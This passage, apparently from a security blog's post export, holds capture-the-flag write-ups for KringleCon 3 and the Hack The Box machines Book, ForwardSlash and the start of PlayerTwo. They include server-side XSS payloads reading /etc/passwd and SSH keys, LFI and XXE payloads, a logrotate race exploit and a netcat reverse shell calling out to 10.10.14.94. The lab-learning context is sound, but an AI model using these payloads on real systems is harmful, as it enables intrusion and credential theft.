somehow?\nCheck out Tom Liston\u0026rsquo;s talk for more info, if you need it.\n And the hints he gives us are:\n PRNG Seeding - While system time is probably most common, developers have the option to seed pseudo-random number generators with other values. Extra Instances - Need extra Snowball Game instances? Pop them up in a new tab from https://snowball2.kringlecastle.com. Mersenne Twister - Python uses the venerable Mersenne Twister algorithm to generate PRNG values after seed. Given enough data, an attacker might predict upcoming values. Twisted Talk - Tom Liston is giving two talks at once - amazing! One is about the Mersenne Twister.   We can as well directly access the game from https://snowball2.kringlecastle.com/ which will be more convenient for analysis. The game is an equivalent of the Battleship board game, we need to throw snowballs and hit the hidden snow forts until we destroy all of them. There are 4 different difficulties.\nSnowball Fight   Easy and Medium:\nIn the Easy and Medium level, we can choose the Player Name and can beat the game quite easily by playing normally as the computer is not very smart:\neasy game   When we win we get the following message:\ngame win   In the case we loose we get:\ngame Over   So if our understanding is correct, in the Easy and Medium level we can choose what is the seed used to generate the board. This means that if we use always the same seed, the board will always be the same. And it appears that the seed used on these levels is the Player Name. For instance, for a seed=noobintheshell we get the following enemy board each time:\nsolution board seed=noobintheshell   The same goes for our board that is as well always the same for a given seed.\nHard:\nIn Hard mode, we can\u0026rsquo;t choose the seed, however, we see it (our Player Name) when we start the game. So what we can do to beat this level is to run the game in Easy mode (in another tab) with the seed used in Hard mode. We will know where the snow castles are.\nImpossible:\nIn this mode, we can\u0026rsquo;t make any single mistake as the attacker is successful at each turn.\nHere, we do not get to know the seed used at all. However, we get to know from the game description that hundreds of random seed are generated before one is picked up. The tested ones are shown in the HTML code of the page:\nrandom seeds attempted - snippet   As we know from the hints, the Python random function is used to generate those random numbers. This function uses the Marsenne-Twister algorithm for the PRNG. This algorithm has a known weakness: if we have enough consecutive random numbers, we can possibly predict the next ones. We can use the marsene-twister-predictor to achieve that. We can install it with:\n$ pip3 install mersenne-twister-predictor Then we need to get the list of random numbers that we saw in the HTML code in a text file, one number per line. For the prediction to work, we need exactly the last 624 generated random numbers because Marsene-Twister uses a state table of 624 values. Then simply call the below command to get the next random number:\n$ cat random_numbers.txt | mt19937predict | head -n 1\n71766020 Then, as for the Hard level, we can use this seed on the Easy level to get the castle placement and beat the Impossible level:\nimpossible win!   To validate the challenge, this must be done from inside the game terminal, not from the dedicated website.  Tangle gives us some hints to beat Objective 11a and Objective 11b:\nTangle Coalbox:\nCrikey - that\u0026rsquo;s it! You\u0026rsquo;ve done the Impossible! You\u0026rsquo;ve impressed this old elf today. Great work identifying and abusing the pseudo-random sequence.\nNow, the REAL question is, how else can this be abused? Do you think someone could try and cheat the Naughty/Nice Blockchain with this? If you have control over to bytes in a file, it\u0026rsquo;s easy to create MD5 hash collisions. Problem is: there\u0026rsquo;s that nonce that he would have to know ahead of time.\nA blockchain works by \u0026ldquo;chaining\u0026rdquo; blocks together - so there\u0026rsquo;s no way that Jack could change it without it messing up the chain… Maybe if you look at the block that seems like it got changed, it might help. If Jack was able to change the block AND the document without changing the hash… that would require a very UNIque hash COLLision.\nApparently Jack was able to change just 4 bytes in the block to completely change everything about it. It\u0026rsquo;s like some sort of evil game to him. That\u0026rsquo;s about all the help I can give you, kid, but Prof. Petabyte may have more.\n  MD5 Hash Collisions - If you have control over to bytes in a file, it\u0026rsquo;s easy to create MD5 hash collisions. Problem is: there\u0026rsquo;s that nonce that he would have to know ahead of time.    Blockchain \u0026hellip; Chaining - A blockchain works by \u0026ldquo;chaining\u0026rdquo; blocks together - each new block includes a hash of the previous block. That previous hash value is included in the data that is hashed - and that hash value will be in the next block. So there\u0026rsquo;s no way that Jack could change an existing block without it messing up the chain\u0026hellip; Blockchain Talk - Qwerty Petabyte is giving a talk about blockchain tomfoolery! Block Investigation - The idea that Jack could somehow change the data in a block without invalidating the whole chain just collides with the concept of hashes and blockchains. While there\u0026rsquo;s no way it could happen, maybe if you look at the block that seems like it got changed, it might help. Unique Hash Collision - If Jack was somehow able to change the contents of the block AND the document without changing the hash\u0026hellip; that would require a very UNIque hash COLLision. Imposter Block Event - Shinny Upatree swears that he doesn\u0026rsquo;t remember writing the contents of the document found in that block. Maybe looking closely at the documents, you might find something interesting. Minimal Changes - Apparently Jack was able to change just 4 bytes in the block to completely change everything about it. It\u0026rsquo;s like some sort of evil game to him.   Items Some items are spread around the Santa\u0026rsquo;s castle. At the exception of the Proxmark3, used to complete Objective 5, the items can only be used to operate the Santavator. Here is their location:\n   Item Location Description     Broken Candycane Near the castle entrance, on the floor Like one you\u0026rsquo;d find between the couch cushions   Hex Nut 1 Entry Area next to the Santavator An unremarkable, stainless steel, hex nut   Hex Nut 2 Dining Room, hidden under the table An unremarkable, stainless steel, hex nut   Green Bulb Top left corner of the Courtyard It\u0026rsquo;s a green bulb from those big, old-school christmas lights.   Elevator Service Key Talk to Sparkle Redberry next to the Satavator This key opens the service panel on the Santavator.   Red Bulb Top right of the Talks Lobby (2nd floor) It\u0026rsquo;s a red bulb from those big, old-school christmas lights.   Elevator 1.5 Button Bottom right of the Speaker UNpreparedness Room Like those awkward semi-sequels, this button goes almost to the next floor   Large Marble Workshop, on the floor It\u0026rsquo;s a marble\u0026hellip;that attracts sparkles.   Rubber Ball Wrapping Room, on the floor Great for bouncing electrons, probably.   Proxmark3 Wrapping Room, on the floor RFID Swiss-army tool   Portals Speaker UNpreparedness Room, from the vending machine Good for shifting the Super Santavator Sparkle Stream across spacetime\u0026hellip; or eating!   Yellow Bulb Rooftop, on the floor It\u0026rsquo;s a yellow bulb from those big, old-school christmas lights.    Christmas Eggs One of the quests I enjoy the most in the Holiday Hack challenges is to find as many hidden Eggs as possible! Here are the ones I spotted this year:\n   Location Egg     Challenge title Three French Hens comes from The Twelve Days of Christmas Christmas carol (the 3rd day of Christmas for the 3rd KringleCon)   Castle Approach Richard F. Hall panel on the grass, building homes in Jersey Shore   Castle Approach one of the hens, Jean-Claude, says \u0026ldquo;Jacques DuGivre!\u0026rdquo; in French which translates to Jack Frost.   Castle Entry is the painting a portrait of Ed Skoudis?   Wrapping Room the email on the wall asking Iceman if the name Proxmark3 could be used freely   Objective 1 the Enigma Machine on the billboard image   Objective 6 the Splunk user is Kris Kringle, another name for Santa…but that could as well refer to the main protagonist of Miracle on 34th Street   Objective 6 Alice Bluebird is the main character of the graphic novel Through the Looking Glass Table from Splunk.   Objective 6 the Lollipop Guild refers to The Wizard of Oz   Objective 8 ASCII art in the server\u0026rsquo;s tmp folder   Objective 9 the FTP server ftp.osuosl.org actually exists and is owned by the Open Source Lab @ Oregon State University   Objective 9 the final letter we retrieve refers to a lot of characters from Rudolph the Red-Nosed Reinder   Objective 9 the final letter we retrieve Tanta Kringle is a character from Santa Claus Is Comin To Town   Objective 11 the elves on the shelf that are reporting kids bat behavior   CranPi 1 Jason The Plant hidden in the \u0026lsquo;plant\u0026rsquo; menu (made appearances in past challenges)   CranPi 2 the SESSNAME environment variable is Munchkin Wrangler which refers to The Wizard of Oz movie   Soundtrack the song played in the Dining Room is a remix of a The Year Without A Santa Claus song   Soundtrack the song in the Courtyard is a remix of a You\u0026rsquo;re a Mean One, Mr Grinch   Soundtrack the song in the Kitchen is a remix of Jimmy Boyd\u0026rsquo;s I saw Mommy kissing Santa Claus   Soundtrack the Santavator\u0026rsquo;s song is a remix of the Girl from Ipanema   Soundtrack the song in the ??? room is a remix of I Wish I Could Be Santa Claus from A Muppets Christmas   Soundtrack Santa\u0026rsquo;s transformation song is a remix of Zat You Santa Claus from Louis Armstrong   The Elf C0de lollipops and Munchkins refer to the to The Wizard of Oz movie   Sort-O-Matic the Island of Misfit Toys refers to Rudolph the Red-Nosed Reinder   Snowball Game the ID used for the win code is HughRansomDrysdale who is the villain in the movie Knives Out   Snowball Game the QR code shown when we loose directs us to www.counterhack.com    Additional Ressources Objective 3  https://www.electronjs.org https://github.com/electron/asar https://nodejs.org/en/download/  Objective 6  https://attack.mitre.org/matrices/enterprise/ https://github.com/splunk/attack_range https://docs.splunk.com/Documentation/SCS/current/SearchReference/RexCommandOverview https://docs.splunk.com/Documentation/SCS/current/SearchReference/Aggregatefunctions#distinct_count.28.26lt.3Bvalue.26gt.3B.29_or_dc.28.26lt.3Bvalue.26gt.3B.29 https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1082/T1082.md https://github.com/frgnca/ https://attack.mitre.org/techniques/T1123/ https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1123/T1123.md https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md#atomic-test-3---powershell-registry-runonce https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat https://zeek.org/ https://tools.ietf.org/html/rfc74653 https://gchq.github.io/CyberChef/  Objective 8  https://portswigger.net/burp https://portswigger.net/web-security/file-path-traversal https://ngrok.com/ https://snyk.io/research/zip-slip-vulnerability  Objective 10  https://www.lifewire.com/web-browser-developer-tools-3988965  Objective 11a  https://github.com/python/cpython/blob/master/Doc/library/random.rst https://github.com/python/cpython/blob/master/Modules/_randommodule.c  Objective 11b  https://github.com/corkami/collisions/blob/master/unicoll.md https://hexed.it/ https://github.com/corkami/collisions#pdf  CranPi Terminal 7  https://scapy.net/  ","description":"This year’s challenges were a good mix of defensive and offensive skills. Topics varied from webapp hacking, crypto, log analysis, binary analysis to improving JS, regex and network skills. There were as well some simulated hardware challenges. The most challenging part was the analysis and recovery of a custom blockchain's block that was stealthily altered.","id":0,"section":"posts","tags":["kringlecon","holidayhack"],"title":"KringleCon 3: Three French Hens","uri":"https://noobintheshell.com/posts/kringlecon3/"},{"content":"  Book is a Medium Linux box created by MrR3boot. It was released on February 22nd, 2020 and retired on July 11th, 2020. The users rated the difficulty 6.2/10 and gave an appreciation score of 4.1/5.\nBook Info Card   TL;DR We access a virtual library where we can download, upload and comment books. The account registration flow contains a vulnerability that allows overwriting any user’s password. We overwrite the admin’s and to access the admin panel. There, we can download a PDF file containing the list of the books of the virtual library. There is a Server-Side XSS vulnerability during the generation of PDFs. From a user account, we can inject some XSS code to read local files that will be executed server-side when we generate a PDF as admin. We leak the user reader SSH private key this way and grab the user flag. The server uses a version of logrotate vulnerable to a Race Condition. As it is run as a cronjob as root, we can elevate our privileges and get the root flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -p- 10.10.10.176\n   PORT STATE  SERVICE  VERSION     22/tcp  open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)   80/tcp open http Apache httpd 2.4.29 ((Ubuntu))     We discover the usual SSH server and HTTP ports opened.\nWeb discovery We access a login page where we can register to access a virtual library:\nwebsite home page   As a user, we have access to the following features:\n we can download PDFs on flowers:  books download   The download links are like:\nhttp://10.10.10.176/download.php?file=1 and the files downloaded are like 1.pdf. So maybe a good spot for Arbitrary File Read or Local File Inclusion.\n we can search for books in the database:  search books   Maybe a SQL Injection to exploit here? The GET request is like:\nhttp://10.10.10.176/search.php?search=xxx  we can submit books feedbacks:  book feedback   When we do that we get the following message:\nYour feedback sent to Administrator. So maybe an XSS or CSRF to exploit here.\n we can submit new documents:  book submission   Whatever we submit, we get the following message:\nThanks for the submission. We will evaluate and update the list This could be a good spot for file upload vulnerabilities.\n we can contact the admin:  contact form   Another spot for XSS or CSRF vulnerabilities. We get as well the admin email address that could be useful later.\n finally, we can view our profile and modify our name:  profile information   Maybe we can exploit a missing access control check issue here and force our account with an Admin role instead of User.\nA basic file/directory scan discovers the following:\n$ gobuster dir -w ../../wordlists/big.txt -u 10.10.10.176 -x php\n[\u0026hellip;]\n/admin (Status: 301)\n/books.php (Status: 302)\n/contact.php (Status: 302)\n/db.php (Status: 200)\n/docs (Status: 301)\n/download.php (Status: 302)\n/feedback.php (Status: 302)\n/home.php (Status: 302)\n/images (Status: 301)\n/index.php (Status: 200)\n/logout.php (Status: 302)\n/profile.php (Status: 302)\n/search.php (Status: 302)\n/settings.php (Status: 302) The /admin page shows a Sign In feature, but it is disabled.\nGaining Access As we have seen, there is room for plenty of vulnerabilities to exploit. Unfortunately, most of them are rabbit-holes. There is an XSS vulnerability in the name but it is limited to 10 characters, so except injecting some basic HTML like \u0026quot;\u0026gt;\u0026lt;\u0026lt;h1\u0026gt;A we cannot do much.\nWhen we create an account, a Javascript code checks that the username is not longer than 10 characters and that the email address is not longer than 20. This check is as well done server-side. The account ID seems to be the email address as we can create multiple accounts with the same name as long as the email is unique. But what if the email truncation is done after the ID is checked and before the data is persisted in the database? This means that we could possibly rewrite another user account data…like the admin account. By creating an account with the following POST data:\nname=noobadmin\u0026amp;email=admin%40book.htb AAAA\u0026amp;password=noobadmin we successfully overwrite the admin password! The email address is first checked to be unique, then truncated to 20 characters, trimmed and finally, a SQL query persists the password. We can now login into the admin panel:\nadmin panel   We now have access to the following admin features:\n list users and delete them, read user messages and delete them, read user feedbacks and delete them, download the list of users and books as PDF.  When downloading the user list, we see that one of the tests we did previously (the HTML injection in the name) is output:\nuser data PDF export   But we are still limited to 10 characters here. The other PDF lists the book names and authors, let’s try the same there. From a user account, we make a new book submission and inject some HTML code like \u0026lt;h1\u0026gt;TESTTEST\u0026lt;/h1\u0026gt;. This results in:\ncollection data PDF export   Good, we can execute Javascript without filters apparently. After a little research on what to do with that, I came upon this article describing how to exploit a Server-Side XSS when generating a PDF dynamically. That’s quite neat. Let’s try to read /etc/passwd. The payload is:\n1 2 3 4 5  \u0026lt;script\u0026gt; x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open(\u0026#34;GET\u0026#34;,\u0026#34;file://**/etc/passwd**\u0026#34;);x.send(); \u0026lt;/script\u0026gt;   We put it as the book title or the author…and we get:\narbitrary file read   We find the unique user reader. Let’s check if it holds an SSH private key:\n1 2 3 4 5  \u0026lt;script\u0026gt; x=new XMLHttpRequest; x.onload=function(){document.write(this.responseText)}; x.open(\u0026#34;GET\u0026#34;,\u0026#34;file://**/home/reader/.ssh/id_rsa**\u0026#34;);x.send(); \u0026lt;/script\u0026gt;   And surprise:\nreader SSH private key   We can simply copy/paste the whole content and use it to grab the user flag:\n$ ssh -i reader_rsa reader@10.10.10.176\n$ cat user.txt\n51c1************************95bc Local Reconnaissance \u0026amp; Enumeration We find an lse.sh script in reader home folder which is a Linux enumeration script. We can launch it but it does not show any useful information.\nThere is as well a backup folder that contains some Apache access.log* files. This suggests that logrotate is used. The version of logrotate is 3.11.0. This version is vulnerable to a Race Condition and the tool logrotten can be used to exploit it.\nWith pspy64, we confirm that there is a cronjob that calls logrotate as root:\npspy64   Privilege Escalation As per the logrotten readme file, we check all the prerequisites:\n logrotate is run as root, we have write access in the folder where access.log is rotated, we do not have access to /root/log.cfg file but we can see that logrotate can create files.  Let’s compile logrotten on the server:\n$ gcc lr.c -o lr\n$ chmod +x lr We can execute the following command:\n$ echo \u0026ldquo;test\u0026rdquo;\u0026gt;/home/reader/backups/access.log \u0026amp;\u0026amp; ./lr -d /home/reader/backups/access.log This will create an empty access.log file under /etc/bash_completion.d with reader as owner. All files in this folder are loaded with each new user session:\nlogrotten   We can now write our reverse shell in /etc/bash_completion.d/access.log, start a Netcat listener and wait for root to execute it:\n$ echo \u0026ldquo;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.94 1234 \u0026gt;/tmp/f\u0026rdquo; \u0026gt; /etc/bash_completion.d/access.log root flag   We can grab root private SSH key on the way in /root/.ssh.\nConclusion This was a really enjoyable box where I learned a new attack vector: Arbitrary File Read through server-side XSS!\nResources [1] Server Side XSS (Dynamic PDF)\nhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf\n[2] Linux Smart Enumeration\nhttps://github.com/diego-treitos/linux-smart-enumeration\n[3] logrotten\nhttps://github.com/whotwagner/logrotten\n","description":"OS: Linux | Level: Medium | Creator: MrR3boot | Released: February 22nd, 2020 | Retired: July 11th, 2020 | Difficulty: 6.2/10 | Appreciation: 4.1/5","id":1,"section":"posts","tags":["arbitrary_file_read","server-side_xss","dynamic_pdf","logrotate","race_condition"],"title":"Hack The Box :: Book","uri":"https://noobintheshell.com/posts/htb_book/"},{"content":"  ForwardSlash is a Hard Linux box created by InfoSecJack and chivato. It was released on April 4th, 2020 and retired on July 4th, 2020. The users rated the difficulty 6.3/10 and gave an appreciation score of 3.8/5.\nForwardSlash Info Card   TL;DR We access a website defaced by a hacker group. Checking for VHOSTs, we find a backup website with a login page. We can register and log in. The vulnerable feature has been poorly disabled as we can still call it to access a developer page that is protected by IP filtering. The feature is vulnerable to LFI and we can retrieve the pages source code with a PHP wrapper. The user chiv password is hardcoded in one of them. Once connected through SSH, we find multiples notes left by chiv that lead us to a backup config file that should contain the old database credentials. We exploit a SUID binary backup (owned by pain) to read that config file and retrieve pain password and therefore, the user flag. In pain home folder we find an encrypted file and the script used to encrypt it. We retrieve the encryption key with a dictionary attack. It message leaks the password of a LUKS image. pain is a sudoer and can run the commands to decrypt the image and mount it as root. The image contains root SSH private key that we use to get the root flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -p- 10.10.10.183\n   PORT STATE  SERVICE  VERSION     22/tcp  open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)   80/tcp open http Apache httpd 2.4.29 ((Ubuntu))     We discover the usual SSH server and HTTP ports opened.\nWeb discovery Browsing the IP address redirects to http://forwardslash.htb. We add the domain to the /etc/hosts file. We then access a website defaced by a hacker group called The Backslash Gang:\nwebsite landing page   They give some hints on the vulnerabilities they exploited:\nThis was ridiculous, who even uses XML and Automatic FTP Logins A file/folder discovery does not show much. We continue with a VHOST scan:\ngobuster vhost -u http://forwardslash.htb/ -w ../../wordlists/big.txt | grep -E \u0026#34;Status: (2|3)\u0026#34;   We discover backup.forwardslash.htb that we add as well to the hosts file. The backup page shows a login page:\nbackup landing page   We can sign up to access a dashboard:\nhttp://backup.forwardslash.htb/welcome.php   There is a nice Quick Message from Chivato:\nquick message   The Change Your Profile Picture feature shows a disabled input:\nhttp://backup.forwardslash.htb/profilepicture.php   The vulnerability should be there and we can easily modify the HTTP code to enable the input and the button.\nA new file/folder discovery shows:\n$ gobuster dir -u http://backup.forwardslash.htb -w ../../wordlists/big.txt -x php\n[\u0026hellip;]\n/api.php (Status: 200)\n/config.php (Status: 200)\n/dev (Status: 301)\n/environment.php (Status: 302)\n/index.php (Status: 302)\n/login.php (Status: 200)\n/logout.php (Status: 302)\n/register.php (Status: 200)\n/welcome.php (Status: 302) The /dev folder shows the following message:\n403 Access Denied\nAccess Denied From 10.10.14.94 It is probably only accessible from the localhost. We tried some well-known HTTP headers to bypass this kind of filter, but no success.\nGaining Access We can easily edit the input and the button HTML code to remove the disabled attribute and then try to call /dev/index.php that will bypass the filter. This will include the /dev/index.php page:\ninclude /dev/index.php   We access an XML API Test feature which is probably what the hacker group was referring to in its message. Let’s see what else we can do through this Local File Inclusion (LFI) vulnerability. We can read local system files:\n$ curl http://backup.forwardslash.htb/profilepicture.php -H \u0026ldquo;Cookie: PHPSESSID=2jlmsmrq9r8vabqs1s1j1qqq0p\u0026rdquo; -d \u0026ldquo;url=/etc/passwd\u0026rdquo;\n[\u0026hellip;]\npain:x:1000:1000:pain:/home/pain:/bin/bash\nchiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash\nmysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false And we can even read a page source code with PHP wrappers as follows:\n$ curl http://backup.forwardslash.htb/profilepicture.php -H \u0026ldquo;Cookie: PHPSESSID=2jlmsmrq9r8vabqs1s1j1qqq0p\u0026rdquo; -d \u0026ldquo;url=php://filter/convert.base64-encode/resource=dev/index.php\u0026rdquo; We get the source code encoded in base64. Once decoded, we can read the user chiv FTP password:\n/dev/index.php snippet — credentials leak \u0026#43; XXE   On top of that, we see as well that XML External Entities (XXE) can be processed, which is another vulnerability that can be used to read local files or, in certain cases (not here), get Remote Code Execution (RCE).\nIf we have a look at the test done to filter access to /dev, we see that the IP filtering can be bypassed if we use the admin account:\n/dev/index.php snippet — IP filtering   Strangely, the admin account does not exist. We can create it and access the/dev/index.php page without bypass. From there, we can exploit the XXE to read files as well with this payload:\n\u0026lt;!DOCTYPE foo [ \u0026lt;!ELEMENT foo ANY \u0026gt;\n\u0026lt;!ENTITY xxe SYSTEM \u0026ldquo;file:///etc/passwd\u0026rdquo; \u0026gt;]\u0026gt;\n\u0026lt;api\u0026gt;\n\u0026lt;request\u0026gt;\u0026amp;xxe;\u0026lt;/request\u0026gt;\n\u0026lt;/api\u0026gt; The FTP code leads to an RFI that we can use to trig XSS. We can query a remote FTP server for a file called debug.txt. If we start an FTP server on our box, configure the chiv user/password and serve a debug.txt file containing some Javascript code, we can then execute it with:\nhttp://backup.forwardslash.htb/dev/index.php?xml=ftp://10.10.14.94/\u0026quot; The \u0026quot; is important here to pass the regex filter.\nAnyway…the FTP credentials are re-used for the system user. We can log in through SSH.\nLocal Reconnaissance \u0026amp; Enumeration Now that we have a shell as chiv we can explore the box. The user flag is in pain home directory. We can read some more files in there. First, a note.txt from chiv that contains:\nPain, even though they got into our server, I made sure to encrypt any important files and then did some crypto magic on the key\u0026hellip; I gave you the key in person the other day, so unless these hackers are some crypto experts we should be good to go.\n-chiv\n Then there is a encryptorinator folder that contains an encrypted file ciphertext as well as the Python script used to encrypt it: encrypter.py.\nchiv mentions that he encrypted some ‘important’ files. By looking around we find another message in the backup config file /var/www/backup.forwardslash.htb/config.php:\n//credentials for the temp db while we recover, had to backup old config, didn't want it getting compromised -pain The backup config file is found in /var/backup/config.php.bak and can only be read by pain. We find another note.txt along with it:\nChiv, this is the backup of the old config, the one with the password we need to actually keep safe. Please DO NOT TOUCH.\n-Pain\n By checking for SUID binaries, we find /usr/bin/backup owned by pain. This looks like the way to pivot. We can execute it:\n/usr/bin/backup   This is a backup viewer so we can probably read the config.php.bak file with it. It seems to check for a file that does not exist and that seems to be an MD5 hash. The filename changes each time we launch the tool. Actually, it changes every second.\nWe find yet another note.txt that we missed during the enumeration phase at the root of http://forwardslash.htb:\nPain, we were hacked by some skids that call themselves the \u0026ldquo;Backslash Gang\u0026rdquo;\u0026hellip; I know\u0026hellip; That name\u0026hellip;\nAnyway I am just leaving this note here to say that we still have that backup site so we should be fine.\n-chiv\n Privilege Escalation User pivoting We can copy the backup binary locally with scp and open it with Ghidra. The main function is quite self-explanatory:\nmain function snippet   The filename is the MD5 hash of the local time with format HH:MM:SS. That’s why it changes each second. What we can do here is to create a symlink to /var/backup/config.php.bak with the name being the MD5 hash of the current time. We need to do that in less than a second. The following one-liner is all we need:\n$ ln -s /var/backups/config.php.bak $(export t=$(date +%H:%M:%S);echo -n $t | md5sum | awk '{ print $1 }') \u0026amp;\u0026amp; backup And we get pain password (it is not a hash) that he re-used as well for his system account:\npain credentials leak   We log in through SSH and get the user flag.\nRoot escalation Once logged in with pain, we see that he can run some commands as root:\nsudo -l   LUKS is a disk encryption tool, so the first guess is that there is an encrypted drive/image somewhere that we can decrypt and mount. To do that we would need a password that we don’t have yet.\nWe found previously an encrypted file with the script used to encrypt it. Let’s analyze the script:\nencrypter.py   Quite a basic encryption. We can easily re-use the decrypt function to perform a dictionary attack:\nWe output the decryption string once we find the word the. The output is:\ndecrypted message   We have the location of the encrypted image and the password to decrypt it. With that, we execute the following commands to decrypt and mount the image encrypted_backup.img (pain is member of the group backupoperator so he can read the image):\n$ cd /var/backups/recovery\n$ mkdir mnt\n$ sudo /sbin/cryptsetup luksOpen encrypted_backup.img backup\nEnter passphrase for encrypted_backup.img: cB!6%sdH8Lj^@Y*$C2cf\n$ sudo /bin/mount /dev/mapper/backup ./mnt/\n$ cd mnt The image contains root SSH private key id_rsa. We retrieve it, log in through SSH and get the root flag!\nConclusion This was quite a straightforward box, more on the Medium difficulty I would say. No insane enumeration to do so I completed it quite easily :) Except for the LUKS part, the concepts seen can be found in many other boxes.\nResources [1] XML External Entity (XXE) Processing\nhttps://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\n[2] LUKS\nhttps://guardianproject.info/archive/luks/`\n","description":"OS: Linux | Level: Hard | Creators: InfoSecJack \u0026 chivato | Released: April 4th, 2020 | Retired: July 4th, 2020 | Difficulty: 6.3/10 | Appreciation: 3.8/5","id":2,"section":"posts","tags":["lfi","xxe","xss","luks"],"title":"Hack The Box :: ForwardSlash","uri":"https://noobintheshell.com/posts/htb_forwardslash/"},{"content":"  PlayerTwo is an Insane Linux box created by MrR3boot and b14ckh34rt. It was released on December 14th, 2019 and was retired on June 27th, 2020. The users rated the difficulty 7.7/10 and gave the box an appreciation score of 4.4/5.\nPlayerTwo Info Card   TL;DR We start by enumerating a VHOST on port 80 that gives us access to a login page. We discover as well an API endpoint totp. But we can’t use it without credentials. On port 8545 we find an Twirp API instance. We find the .proto definition that describes the API calls we can do. From there, we retrieve a set of users and passwords to authenticate through the login page discovered. After logging in, we are asked for a One-Time-Password (OTP) that we do not have. The OTP screen leaks the fact that we can use either an SMS code or a backup code to log in. We use this information to enumerate the totp API and get a backup code. We access the product page with some documentation and a firmware binary that we can download. We have as well access to a firmware check page to validate its signature. We alter the firmware to upload and execute a PHP reverse shell. The signature check is flawed. We have now a shell as www-data. We see that Mosquitto (an MQTT broker) is running. By subscribing to the SYS topic we retrieve the SSH private key of the user observer. And with it, the user flag. The product binary (Protobs) is owned by root and has the SUID bit set. We grab the binary and the needed libraries, reverse it and exploit a heap vulnerability to get a root shell and the final flag.\nReconnaissance \u0026amp; Enumeration Open Ports An NMAP scan shows the following (partial) output:\n$ sudo nmap -sS -sV -p- 10.10.10.170\n   PORT STATE  SERVICE  VERSION     22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)   80/tcp open http Apache httpd 2.4.29 ((Ubuntu))   8545/tcp  open http (PHP 7.2.24-0ubuntu0.18.04.1)     We discover:\n the usual OpenSSH 7.6p1 server on its default port, an Apache 2.4.29 web server on the default HTTP port, what seems to be another web server on port 8585.  Web discovery Browsing the IP address shows the following error message that leaks the domain name. We can add the domain as well as the www host to the /etc/hosts file:\nhttp://10.10.10.170   But we get the same page with the FQDN and we do not find anything with a directory/file discovery. Next step is to check if other VHOSTs exist:\n$ gobuster vhost -u player2.htb -t 10 -w wordlists/big.txt | grep \u0026quot;Status: 200\u0026quot;\nproduct.player2.htb (Status: 200) [Size: 5063] We get a hit that we add again the the hosts file. The new landing page shows a login page:\nhttp://product.player2.htb   We try some basic credentials without success. Then we start to fuzz files and directories with wfuzz. We find the following:\napi/\nassets/\nimages/\nimages/\nindex.php\nhome.php\nmail.php Calling mail.php only shows an alert:\n$ curl http://product.player2.htb/mail.php\n\u0026lt;script\u0026gt;alert(\u0026quot;Thanks for your visit. Will get back to you as soon as we can!\u0026quot;);window.location=\u0026quot;home\u0026quot;;\u0026lt;/script\u0026gt; Fuzzing with a bigger dictionary unveils /api/totp:\n$ curl http://product.player2.htb/api/totp\n{\u0026quot;error\u0026quot;:\u0026quot;Cannot GET /\u0026quot;}\n$ curl -XPOST http://product.player2.htb/api/totp\n{\u0026quot;error\u0026quot;:\u0026quot;Invalid Session\u0026quot;}\n But in order to call this API, we first need a valid session cookie.\nPort 8545 This port seems to host an API:\nhttp://product.player2.htb:8545/   From the error message, we get that the API is based on Twirp, “a framework for service-to-service communication emphasizing simplicity and minimalism”. It is developed by Twitch in Go and is built on Protobuf. The documentation can be found here. Basically, you create a .proto file that contains the API description and Twirp uses it to generate the client and server code skeletons. Then, it is up to you to code the business logic.\nIn our case, we should as well look for the PHP port TwirPHP and its documentation.\nThere is no way we can interact with this API if we do not know anything about its definition. As per documentation best practices, the folder structure should look like this:\n/generated\n/\u0026lt;namespace\u0026gt;\n// generated files\n/src\n/\u0026lt;namespace\u0026gt;\n// service implementation\n/proto\nservice.proto What we probably need to get is this .proto definition file, the source of truth of the service design. But searching for the proto folder or fuzzing the .proto filename was unsuccessful on both port 80 and 8545 and with both the FQDN and the IP address.\nI must admit that I got stuck for a few days at this point, trying to enumerate everything! I paused for a while and when I got back to this box and restarted the enumeration from scratch, I fuzzed by mistake http://player2.htb (without the www.) and that is where I found that bloody proto folder!! Then I fuzzed the proto filename and downloaded it:\n$ wget http://player2.htb/proto/generated.proto Gaining Access Login and bypass OTP The proto file is quite short:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  syntax = \u0026#34;proto3\u0026#34;package twirp.player2.auth; option go_package = \u0026#34;auth\u0026#34;service Auth {  rpc GenCreds(Number) returns (Creds); }message Number {  int32 count = 1; // must be \u0026gt; 0 }message Creds {  int32 count = 1;  string name = 2;  string pass = 3; }  We get:\n the endpoint twirp.player2.auth, the service name Auth, the method GenCreds.  The method takes an integer as argument and returns some sort of credentials. As per Twirp documentation, the API call should be a POST call to:\n/twirp/endpoint.service/method with the argument in the body in JSON format. The call that should work though, returns an error:\n$ curl -XPOST http://product.player2.htb:8545/twirp/twirp.player2.auth.Auth/GenCreds -H 'Content-Type: application/json' -d '{\u0026quot;count\u0026quot; 1}'\n{\u0026quot;code\u0026quot;:\u0026quot;internal\u0026quot;,\u0026quot;msg\u0026quot;:\u0026quot;internal error\u0026quot;,\u0026quot;meta\u0026quot;:{\u0026quot;cause\u0026quot;:\u0026quot;Call to undefined function Google\\Protobuf\\Internal\\bccomp()\u0026quot;}}\n What worked, is to send an empty payload. Each call seems to return a couple of username/password that is each time different:\nAPI calls   In the end, we see only 4 different usernames and 4 